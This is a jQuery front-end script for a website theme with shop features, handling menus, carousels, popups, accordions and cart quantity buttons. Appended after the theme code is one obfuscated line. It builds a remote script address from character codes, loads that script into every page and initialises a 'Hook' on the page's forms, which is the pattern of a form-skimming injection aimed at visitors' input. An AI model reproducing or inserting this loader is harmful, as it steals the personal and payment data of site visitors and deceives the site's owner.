(function ($) {
	"use strict";


	// data background js start
	$("[data-background").each(function () {
		$(this).css("background-image", "url( " + $(this).attr("data-background") + "  )");
	});
	$("[data-bg-color]").each(function () {
		$(this).css("background-color", $(this).attr("data-bg-color"));
	});
	// data background js end

	// Preloader start
	$(window).on('load', function () {
		$(".preloder_part").fadeOut();
		$(".spinner").delay(1000).fadeOut("slow");
	});
	// preloader end

	// toggle search bar start
	$('.header_search_wrap .search_main > i').click(function () {
		$(".header_search_wrap .search_main > i").hide();
		$(".header_search_wrap .search_main span").show();
		$('.search_form_main').addClass('active_search');
		$('.search_form_main .search-field').focus();
	});
	$('.header_search_wrap .search_main span').click(function () {
		$(".header_search_wrap .search_main > i").show();
		$(".header_search_wrap .search_main span").hide();
		$('.search_form_main').removeClass('active_search');
		$('.search_form_main .search-field').focus();
	});
	// toggle search bar end

	// mobile menu start
	$('#menu-all-pages-1, #menu-main-menu-1').metisMenu();

	$('#menu-all-pages-1 .dropdown > a, #menu-main-menu-1 .dropdown > a').on('click', function (e) {
		e.preventDefault();
	});

	$('.main_menu_wrap nav > ul > li').slice(-1).addClass('menu_last');

	$(".hamburger_menu > a").on("click", function (e) {
		e.preventDefault();
		$(".slide-bar").toggleClass("show");
		$("body").addClass("on-side");
		$('.body-overlay').addClass('active');
		$(this).addClass('active');
	});

	$(".close-mobile-menu > a").on("click", function (e) {
		e.preventDefault();
		$(".slide-bar").removeClass("show");
		$("body").removeClass("on-side");
		$('.body-overlay').removeClass('active');
		$('.hamburger_menu > a').removeClass('active');
	});

	$('.body-overlay').on('click', function () {
		$(this).removeClass('active');
		$(".slide-bar").removeClass("show");
		$("body").removeClass("on-side");
		$('.hamburger-menu > a').removeClass('active');
	});
	// mobile menu end

	// back to top start
	$(window).scroll(function () {
		if ($(this).scrollTop() > 200) {
			$('#backtotop:hidden').stop(true, true).fadeIn();
		} else {
			$('#backtotop').stop(true, true).fadeOut();
		}
	});
	$(function () {
		$("#scroll").on('click', function () {
			$("html,body").animate({
				scrollTop: $("#thetop").offset().top
			}, "slow");
			return false
		})
	});
	// back to top end

	// blog post active start
	$('.gallery_post_active').owlCarousel({
		loop: true,
		margin: 0,
		items: 1,
		navText: ['<i class="far fa-chevron-left"></i>', '<i class="far fa-chevron-right"></i>'],
		nav: true,
		dots: false,
		responsive: {
			0: {
				items: 1
			}
		}
	})
	// blog post active end

	//  magnificPopup start
	$('.popup-image').magnificPopup({
		type: 'image',
		gallery: {
			enabled: true
		}
	});

	$('.popup-video').magnificPopup({
		type: 'iframe'
	});
	//  magnificPopup end

	// isotop start
	$('.grid').imagesLoaded(function () {
		// init Isotope
		var $grid = $('.grid').isotope({
			itemSelector: '.grid-item',
			percentPosition: true,
			masonry: {
				// use outer width of grid-sizer for columnWidth
				columnWidth: '.grid-item',
			}
		});

		// filter items on button click
		$('.masonry_active').on('click', 'button', function () {
			var filterValue = $(this).attr('data-filter');
			$grid.isotope({ filter: filterValue });
		});
	});

	//for menu active class
	$('.masonry_active button').on('click', function (event) {
		$(this).siblings('.active').removeClass('active');
		$(this).addClass('active');
		event.preventDefault();
	});
	// isotop end

	// Accordion Box start
	if ($(".accordion-box").length) {
		$(".accordion-box").on("click", ".acc-btn", function () {
		var outerBox = $(this).parents(".accordion-box");
		var target = $(this).parents(".accordion");

		if ($(this).next(".acc-content").is(":visible")) {
			$(this).removeClass("active");
			$(this).next(".acc-content").slideUp(300);
			$(outerBox).children(".accordion").removeClass("active-block");
		} else {
			$(outerBox).find(".accordion .acc-btn").removeClass("active");
			$(this).addClass("active");
			$(outerBox).children(".accordion").removeClass("active-block");
			$(outerBox).find(".accordion").children(".acc-content").slideUp(300);
			target.addClass("active-block");
			$(this).next(".acc-content").slideDown(300);
		}
		});
	}
	// Accordion Box end

	// // price range - start
	if ($("#slider-range").length) {
		$("#slider-range").slider({
			range: true,
			min: 0,
			max: 100,
			values: [0, 40.00],
			slide: function (event, ui) {
				$("#amount").val("$" + ui.values[0] + " - $" + ui.values[1]);
			}
		});
		$("#amount").val("$" + $("#slider-range").slider("values", 0) +
			" - $" + $("#slider-range").slider("values", 1));
	}

	$('.ar_top').on('click', function () {
		var getID = $(this).next().attr('id');
		var result = document.getElementById(getID);
		var qty = result.value;
		$('.proceed_to_checkout .update-cart').removeAttr('disabled');
		if (!isNaN(qty)) {
			result.value++;
		} else {
			return false;
		}
	});
	// // price range - end

	// datepicker
	$('#date').datepicker({
		'format': 'm/d/yyyy',
		'autoclose': true
	  });
	  $('#time').timepicker();

	// niceSelect start
	$('select').niceSelect();
	// niceSelect end

	// quick view plus minus button
	$(".cart-plus-minus").append('<div class="qtybutton minus"><i class="far fa-minus"></i></div><div class="qtybutton plus"><i class="far fa-plus"></i></div>');

	$(".cart-plus-minus").on("click", ".qtybutton.plus, .qtybutton.minus", function () {
		// Get current quantity values
		var qty = $(this).closest(".cart-plus-minus").find(".qty");
		var val = parseFloat(qty.val());
		var max = parseFloat(qty.attr("max"));
		var min = parseFloat(qty.attr("min"));
		var step = parseFloat(qty.attr("step"));

		// Change the value if plus or minus
		if ($(this).is(".plus")) {
			if (max && max <= val) {
				qty.val(max);
			}
			else {
				qty.val(val + step).trigger("change");
			}
		}
		else {
			if (min && min >= val) {
				qty.val(min);
			}
			else if (val > 1) {
				qty.val(val - step).trigger("change");
			}
		}
	});



})(jQuery);
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b